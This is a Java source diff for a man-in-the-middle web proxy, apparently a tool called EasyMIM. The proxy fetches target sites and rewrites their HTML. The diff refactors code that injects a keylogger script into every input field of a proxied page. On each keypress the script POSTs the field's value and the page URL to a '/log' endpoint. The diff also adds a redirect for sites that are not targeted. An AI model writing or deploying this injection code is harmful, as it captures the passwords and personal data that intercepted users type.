@@ -24,36 +24,46 @@ import org.jsoup.nodes.Entities.EscapeMode;
 import org.jsoup.select.Elements;
 
 import Models.ClientInfo;
+import Models.EasyMIMConfig;
+import Models.RequestInfo;
 
-import ui.EasyMIMConfig;
 
 public class WebsiteProcessor {
 	private final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36";
 	public enum Protocol{HTTP,HTTPS};
+	public EasyMIMConfig config;
 	
 	public WebsiteProcessor() {
+		this.config = new EasyMIMConfig();
 		// TODO Auto-generated constructor stub
 	}
 	public WebsiteProcessor(EasyMIMConfig config) {
 		// TODO Auto-generated constructor stub
+		this.config = config;
 	}
 	public void processRequest(HttpServletRequest request, HttpServletResponse response, ClientInfo ci) throws IOException{
-		String endPoint = request.getRequestURI();
 		ci.setBase(request.getParameter("url"));
-		String url = ci.getBase()+endPoint;
+		String endPoint = request.getRequestURI();
+		String url = "https://"+ci.getBase()+endPoint;
+		
+		//redirect if not targeted
+		if(!config.targetURL.equals(ci.getBase())){
+			System.out.println(url);
+			response.sendRedirect(url);
+			return;
+		}
+		
 		String query = request.getQueryString();
 		if(query!=null && !query.equals("null")){
 			url+="?"+query;
 		}
-		String html = getRawResponseAndSetBasic(url,"GET",request,response,ci);
-		String modifiedHtml = processHTML(url, html, url.contains(".js"),ci);
+		RequestInfo ri = new RequestInfo();
+		ri.url = url;
+		String html = getRawResponseAndSetBasic(ri,"GET",request,response,ci);
+		String modifiedHtml = processHTML(ri, html, url.contains(".js"),ci);
 		response.getWriter().write(modifiedHtml);
 	}
-	public String processHTML(String url, String html,boolean isJS,ClientInfo ci) throws MalformedURLException, IOException{
-		//downgrade all links to http
-		//Pattern p = Pattern.compile("https");
-		//Matcher m = p.matcher(html);
-		//String html1 = m.replaceAll("http");
+	public String processHTML(RequestInfo ri, String html,boolean isJS,ClientInfo ci) throws MalformedURLException, IOException{
 		String html1 = html;
 		
 		if(isJS){
@@ -95,24 +105,19 @@ public class WebsiteProcessor {
 			goog.html("");
 		}
 		//keylogger code
-		Elements inputs = doc.select("input");
-		for(Element input:inputs){
-			if(input.attr("id")!=null && !input.attr("id").equals("")){
-				String keyString ="'"+input.attr("id")+"'";
-				String valueString = "$('#"+input.attr("id")+"').val()";
-				String var = "var d = {url:'"+url+"',key:"+keyString+",value:"+valueString+"};";
-				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
-				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
-				var+
-				ajaxString+
-				"}) </script>";
-				doc.append(complete);
-			}
+		if(config.keylogger){
+			addKeylogger(ri,doc);
+		}
+		if(config.popUpMessage!=null && !config.popUpMessage.equals("")){
+			//TODO
+		}
+		if(config.imageURL!=null && !config.imageURL.equals("")){
+			//TODO
 		}
 		return doc.toString();
 	}
-	public String getRawResponseAndSetBasic(String url,String method,HttpServletRequest request, HttpServletResponse response,ClientInfo ci) throws IOException{
-		String link = "https://"+url;
+	public String getRawResponseAndSetBasic(RequestInfo ri,String method,HttpServletRequest request, HttpServletResponse response,ClientInfo ci) throws IOException{
+		String link = ri.url;
 		URL u = new URL(link);
 		HttpURLConnection  conn = (HttpURLConnection) u.openConnection();
 		conn.setReadTimeout(1000);
@@ -173,5 +178,21 @@ public class WebsiteProcessor {
 			}
 		}
 		return out;
+	}
+	private void addKeylogger(RequestInfo ri,Document doc){
+		Elements inputs = doc.select("input");
+		for(Element input:inputs){
+			if(input.attr("id")!=null && !input.attr("id").equals("")){
+				String keyString ="'"+input.attr("id")+"'";
+				String valueString = "$('#"+input.attr("id")+"').val()";
+				String var = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+"};";
+				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
+				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
+				var+
+				ajaxString+
+				"}) </script>";
+				doc.append(complete);
+			}
+		}
 	}
 }
